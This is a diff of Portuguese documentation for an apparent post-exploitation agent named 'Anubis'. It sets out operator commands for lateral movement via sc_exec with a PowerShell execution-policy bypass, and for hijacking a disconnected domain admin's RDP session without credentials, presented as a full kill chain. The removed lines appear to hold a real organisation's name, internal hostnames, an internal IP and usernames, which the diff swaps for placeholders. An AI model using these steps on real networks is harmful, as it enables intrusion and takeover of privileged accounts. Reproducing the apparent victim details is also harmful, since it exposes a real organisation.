@@ -43,7 +43,7 @@ rdp_hijack 3 1
 
 ```
 # 1. No host comprometido A: implanta Anubis no host B como SYSTEM via sc_exec
-sc_exec 10.12.193.4 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
+sc_exec 192.168.1.10 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
 
 # 2. No novo agente (SYSTEM) no host B: lista sessões
 rdp_hijack
@@ -52,9 +52,9 @@ rdp_hijack
 # ID    Station                State          User
 # ─────────────────────────────────────────────────────────────────
 # 0     Services               Idle
-# 1     Console                Active         COPEL\admin_ti
-# 3     RDP-Tcp#2              Disconnected   COPEL\da_silva  ◄
-# 5     RDP-Tcp#4              Active         COPEL\operador
+# 1     Console                Active         CORP\admin_ti
+# 3     RDP-Tcp#2              Disconnected   CORP\jsmith     ◄
+# 5     RDP-Tcp#4              Active         CORP\operador
 
 # 3. Hijacka sessão 3 (domain admin desconectado — sem senha necessária)
 rdp_hijack 3
@@ -101,22 +101,22 @@ Hijack mode (session_id > 0):
 | Active (RDP) | Médio — usuário pode notar | Esperar sessão desconectar |
 | Active (Console) | Alto — tela física exposta | Evitar, ou usar horário de manutenção |
 
-### Full Kill Chain (COPEL)
+### Full Kill Chain
 
 ```
-# Fase 1: acesso inicial em P483078 (Oracle host)
+# Fase 1: acesso inicial em HOST-A
 # [token_steal → domain admin token]
 
-# Fase 2: lateral para P489039 (Win11 workstation)
-sc_exec 10.12.193.4 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
-# Anubis roda como SYSTEM no P489039
+# Fase 2: lateral para HOST-B (Win11 workstation)
+sc_exec 192.168.1.10 "powershell -ep bypass -f C:\Windows\Temp\a.ps1"
+# Anubis roda como SYSTEM no HOST-B
 
-# Fase 3: no novo agente SYSTEM em P489039
+# Fase 3: no novo agente SYSTEM em HOST-B
 rdp_hijack                # lista sessões
-# → sessão 3: COPEL\da_silva (Disconnected)
+# → sessão 3: CORP\jsmith (Disconnected)
 
 rdp_hijack 3              # hijacka sessão
-# → desktop do da_silva aparece na sessão SYSTEM
+# → desktop do jsmith aparece na sessão SYSTEM
 # → acesso completo como domain user sem nova autenticação
 
 # Fase 4: dentro da sessão hijackada
